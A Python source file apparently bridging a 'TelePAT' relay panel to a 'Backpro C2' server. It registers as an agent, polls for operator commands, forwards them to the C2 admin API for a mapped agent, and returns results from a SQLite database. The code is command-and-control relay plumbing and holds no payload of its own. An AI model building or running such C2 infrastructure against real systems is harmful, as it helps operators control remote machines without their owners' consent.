from SlotSDK import SlotSDK
import requests
import sqlite3
import threading
import time
import socket
import platform
import os
from flask import Flask, request, jsonify

RELAY_URL = "ws://192.168.230.133:8081/ws"
SLOT_ID = "backpro-c2-agent"
BACKPRO_URL = "http://127.0.0.1:5000"
HTTP_PORT = 5001
AGENT_ID_FILE = "agent_id.txt"

app = Flask(__name__)

class BridgeState:
    sdk = None


AGENT_MAPPING = {
    12: "b35c628a-5c3a-4886-be5f-0300dc0bfa72"  
    
}


command_mapping = {}

GLOBAL_AGENT_ID = None

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] [Bridge] {msg}")


@app.route('/', methods=['GET', 'POST'])
@app.route('/checkin', methods=['GET', 'POST'])
@app.route('/register', methods=['GET', 'POST'])
@app.route('/agent', methods=['GET', 'POST'])
def agent_checkin():
    return jsonify({
        "status": "ok",
        "agent_id": 1,
        "slot_id": SLOT_ID,
        "version": "1.0.0",
        "hostname": socket.gethostname(),
        "os": platform.system().lower(),
        "arch": platform.machine()
    }), 200


def forward_to_backpro(command_text, arguments="", telepat_agent_id=None, telepat_cmd_id=None):
    try:
        if telepat_agent_id not in AGENT_MAPPING:
            log(f"Error: No UUID mapping for TelePAT agent_id {telepat_agent_id}")
            return False

        backpro_uuid = AGENT_MAPPING[telepat_agent_id]

        payload = {
            "agent_uuid": backpro_uuid,
            "command_text": command_text,
            "arguments": arguments or ""
        }

        headers = {"Content-Type": "application/json"}

        r = requests.post(
            f"{BACKPRO_URL}/api/admin/commands",
            json=payload,
            headers=headers,
            timeout=15
        )

        if r.status_code in (200, 201):
            resp_data = r.json()
            backpro_cmd_id = resp_data.get("command_id") or resp_data.get("id")

            if backpro_cmd_id and telepat_cmd_id:
                
                command_mapping[backpro_cmd_id] = telepat_cmd_id
                log(f"Mapped Backpro ID {backpro_cmd_id} → TelePAT command_id {telepat_cmd_id}")

            log(f"Command forwarded successfully | Backpro ID: {backpro_cmd_id} | Command: {command_text}")
            return True
        else:
            log(f"Forward failed: HTTP {r.status_code} | Response: {r.text}")
            return False

    except Exception as e:
        log(f"Exception forwarding to Backpro: {e}")
        return False

def send_results_to_telepat():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT r.id, r.result_data, r.command_id
            FROM Results r
            WHERE r.id > (SELECT COALESCE(MAX(result_id), 0) FROM sent_results)
        """)
        rows = cursor.fetchall()

        if not rows:
            conn.close()
            return

        for result_id, result_data, backpro_cmd_id in rows:
            
            telepat_cmd_id = command_mapping.get(backpro_cmd_id)

            if not telepat_cmd_id:
                log(f"[Warning] No TelePAT command_id mapping for Backpro command_id {backpro_cmd_id} — skipping result")
                continue

            if not BridgeState.sdk or not BridgeState.sdk.connected:
                log("[Warning] SDK not connected — cannot send result to TelePAT")
                continue

            
            result_payload = {
                "stdout": result_data.strip() if result_data else "",
                "stderr": "",
                "exit_code": 0,  
                "duration": 0,   
                "finished": True
            }

            try:
                BridgeState.sdk.send_result(telepat_cmd_id, result_payload)
                log(f"[Success] Result sent to TelePAT | TelePAT command_id: {telepat_cmd_id} | Backpro ID: {backpro_cmd_id}")

                
                conn.execute("INSERT OR IGNORE INTO sent_results (result_id) VALUES (?)", (result_id,))
                conn.commit()

            except Exception as send_e:
                log(f"[Error] Failed to send result to TelePAT: {send_e}")

        conn.close()

    except Exception as e:
        log(f"[Error] Exception in send_results_to_telepat: {e}")

def command_polling_loop():
    global GLOBAL_AGENT_ID
    while True:
        if (BridgeState.sdk and BridgeState.sdk.registered and 
            BridgeState.sdk.connected and GLOBAL_AGENT_ID):

            cmd = BridgeState.sdk.request_commands(
                agent_id=GLOBAL_AGENT_ID,
                count=1,
                timeout=10
            )

            if cmd:
                telepat_cmd_id = cmd.get("command_id")
                input_data = cmd.get("input_data", {})
                command_text = input_data.get("command", "").strip()
                arguments = input_data.get("arguments", "")

                if not command_text:
                    log("Warning: Empty command received — skipping")
                    continue

                log(f"New command from TelePAT | ID: {telepat_cmd_id} | Command: {command_text}")

                success = forward_to_backpro(
                    command_text=command_text,
                    arguments=arguments,
                    telepat_agent_id=GLOBAL_AGENT_ID,
                    telepat_cmd_id=telepat_cmd_id  
                )

                if success:
                    
                    log("Command forwarded to Backpro")
                else:
                    log("Failed to forward command")

        time.sleep(5)


def background_loop():
    while True:
        send_results_to_telepat()
        time.sleep(10)


if __name__ == "__main__":
    log("Starting TelePAT → Backpro Bridge")

    
    conn = sqlite3.connect("db.sqlite")
    conn.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

    
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=HTTP_PORT, use_reloader=False), daemon=True).start()
    log(f"HTTP server started on port {HTTP_PORT}")

   
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            try:
                GLOBAL_AGENT_ID = int(f.read().strip())
                log(f"Loaded agent_id from file: {GLOBAL_AGENT_ID}")
            except:
                GLOBAL_AGENT_ID = None

    
    BridgeState.sdk = SlotSDK(RELAY_URL, SLOT_ID, lambda msg: None, heartbeat_interval=60)
    threading.Thread(target=BridgeState.sdk.run, daemon=True).start()

    while not (BridgeState.sdk.registered and BridgeState.sdk.connected):
        time.sleep(1)

    log("Connected to TelePAT relay")

    
    if not GLOBAL_AGENT_ID:
        log("Registering new agent in TelePAT...")
        result = BridgeState.sdk.send_agent_registration(
            description="Backpro C2 Bridge",
            hostname=socket.gethostname(),
            os_name=platform.system().lower(),
            arch=platform.machine(),
            version="1.0.0",
            timeout=60
        )
        if isinstance(result, int):
            GLOBAL_AGENT_ID = result
            with open(AGENT_ID_FILE, "w") as f:
                f.write(str(GLOBAL_AGENT_ID))
            log(f"New agent registered in TelePAT: {GLOBAL_AGENT_ID}")
        else:
            log("Agent registration failed!")
    else:
        log(f"Using existing TelePAT agent_id: {GLOBAL_AGENT_ID}")

    # شروع حلقه‌ها
    threading.Thread(target=command_polling_loop, daemon=True).start()
    threading.Thread(target=background_loop, daemon=True).start()

    log("Bridge fully active and ready!")
    log("You can now send commands from TelePAT panel")

    
    while True:
        time.sleep(60)